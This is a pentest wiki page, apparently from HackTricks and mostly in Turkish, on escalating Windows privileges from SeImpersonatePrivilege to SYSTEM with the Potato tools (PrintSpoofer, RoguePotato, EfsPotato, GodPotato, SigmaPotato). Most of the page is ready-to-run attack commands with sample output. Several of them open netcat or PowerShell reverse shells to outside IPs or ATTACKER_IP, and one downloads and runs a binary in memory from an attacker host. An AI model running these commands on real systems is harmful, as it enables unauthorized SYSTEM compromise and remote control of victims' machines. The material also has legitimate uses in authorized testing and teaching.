# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato çalışmıyor** Windows Server 2019 ve Windows 10 build 1809 ve sonrasında. Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** aynı ayrıcalıklardan faydalanarak `NT AUTHORITY\SYSTEM` seviyesinde erişim elde etmek için kullanılabilir. Bu [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` aracını derinlemesine inceliyor; JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 hostlarında impersonation ayrıcalıklarını kötüye kullanmak için kullanılabilir.

> [!TIP]
> 2024–2025 döneminde sıkça bakım yapılan modern bir alternatif SigmaPotato (a fork of GodPotato) olup in-memory/.NET reflection usage ve extended OS support ekler. Aşağıda hızlı kullanım ve repo için References'a bakın.

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Gereksinimler ve yaygın tuzaklar

Aşağıdaki tüm teknikler, aşağıdaki ayrıcalıklardan birine sahip bir bağlamdan impersonation-capable ayrıcalıklı bir servisin kötüye kullanılmasına dayanır:

- SeImpersonatePrivilege (en yaygın) veya SeAssignPrimaryTokenPrivilege
- Token zaten SeImpersonatePrivilege içeriyorsa high integrity gerekmez (IIS AppPool, MSSQL gibi birçok servis hesabı için tipiktir)

Ayrıcalıkları hızlıca kontrol edin:
```cmd
whoami /priv | findstr /i impersonate
```
Operasyonel notlar:

- Eğer shell'iniz SeImpersonatePrivilege içermeyen kısıtlı bir token altında çalışıyorsa (bazı bağlamlarda Local Service/Network Service için yaygındır), hesabın varsayılan ayrıcalıklarını FullPowers ile geri alın, sonra bir Potato çalıştırın. Örnek: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer için Print Spooler servisinin çalışıyor ve yerel RPC endpoint'i (spoolss) üzerinden erişilebilir olması gerekir. PrintNightmare sonrası Spooler'ın devre dışı bırakıldığı sertleştirilmiş ortamlarda RoguePotato/GodPotato/DCOMPotato/EfsPotato'yu tercih edin.
- RoguePotato, TCP/135 üzerinden erişilebilen bir OXID resolver gerektirir. Egress engellenmişse bir redirector/port-forwarder kullanın (aşağıdaki örneğe bakınız). Eski sürümler -f bayrağına ihtiyaç duyuyordu.
- EfsPotato/SharpEfsPotato MS-EFSR'yi sömürüyor; bir pipe engellenmişse alternatif pipe'ları deneyin (lsarpc, efsrpc, samr, lsass, netlogon).
- RpcBindingSetAuthInfo sırasında oluşan 0x6d3 hatası genellikle bilinmeyen/desteklenmeyen bir RPC kimlik doğrulama servisini gösterir; farklı bir pipe/transport deneyin veya hedef servisin çalıştığından emin olun.

## Hızlı Demo

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Notlar:
- -i ile mevcut konsolda etkileşimli bir süreç başlatabilir veya -c ile bir one-liner çalıştırabilirsiniz.
- Spooler servisi gereklidir. Devre dışı bırakıldıysa, bu başarısız olur.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Eğer outbound 135 engelliyse, OXID resolver'ı redirector'ınızda socat ile pivotlayın:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato, geç 2022'de yayımlanan daha yeni bir COM istismar primitivesidir ve hedef olarak Spooler/BITS yerine **PrintNotify** servisini hedefler. İkili, PrintNotify COM sunucusunu başlatır, sahte bir `IUnknown` takar ve ardından `CreatePointerMoniker` aracılığıyla ayrıcalıklı bir callback tetikler. PrintNotify servisi (**SYSTEM** olarak çalışan) geri bağlandığında, süreç döndürülen token'ı çoğaltır ve sağlanan payload'ı tam ayrıcalıklarla çalıştırır.

Key operational notes:

* Works on Windows 10/11 and Windows Server 2012–2022 as long as the Print Workflow/PrintNotify service is installed (it is present even when the legacy Spooler is disabled post-PrintNightmare).
* Requires the calling context to hold **SeImpersonatePrivilege** (typical for IIS APPPOOL, MSSQL, and scheduled-task service accounts).
* Accepts either a direct command or an interactive mode so you can stay inside the original console. Example:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Because it is purely COM-based, no named-pipe listeners or external redirectors are required, making it a drop-in replacement on hosts where Defender blocks RoguePotato’s RPC binding.

Ink Dragon gibi operatörler, SharePoint'te ViewState RCE elde ettikten hemen sonra PrintNotifyPotato'yı çalıştırarak `w3wp.exe` worker'dan SYSTEM'e pivot yapar ve ShadowPad yüklemeden önce bu ayrıcalıkları elde eder.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
İpucu: Eğer bir pipe başarısız olursa veya EDR bunu engellerse, diğer desteklenen pipe'ları deneyin:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Notlar:
- SeImpersonatePrivilege mevcut olduğunda Windows 8/8.1–11 ve Server 2012–2022 genelinde çalışır.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato, varsayılan olarak RPC_C_IMP_LEVEL_IMPERSONATE kullanan service DCOM objects hedefleyen iki varyant sağlar. Sağlanan binaries'i derleyin veya kullanın ve komutunuzu çalıştırın:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (güncellenmiş GodPotato fork)

SigmaPotato, .NET reflection aracılığıyla bellek içi yürütme ve bir PowerShell reverse shell yardımcı programı gibi modern özellikler ekler.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Referanslar

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Servis hesapları için varsayılan token ayrıcalıklarını geri yükleme](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Gizli bir saldırı operasyonunun röle ağını ve iç işleyişini açığa çıkarma](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
